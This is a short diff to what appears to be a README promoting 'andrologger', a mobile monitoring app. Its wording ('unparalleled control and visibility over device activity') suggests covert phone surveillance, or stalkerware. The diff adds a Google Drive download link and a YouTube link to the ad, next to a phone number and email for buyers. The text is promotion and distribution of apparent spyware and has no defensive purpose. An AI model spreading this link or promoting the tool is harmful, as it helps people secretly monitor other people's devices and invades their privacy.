@@ -26,3 +26,7 @@ For inquiries, support, or further details, please reach out via:
 Phone/WhatsApp: +30 6970481925
 Email: andrologger1@gmail.com
 This advanced mobile monitoring solution is the perfect tool for users seeking unparalleled control and visibility over device activity, delivering a comprehensive suite of features in a single, easy-to-use application.
+
+download https://drive.google.com/file/d/1e3xxLZo12SL65TuACnYnTaxikTySeQ-j/view?usp=drivesdk
+
+https://youtu.be/Weakn-x3Wf8?si=1WkXc4reVWsjS2YZ
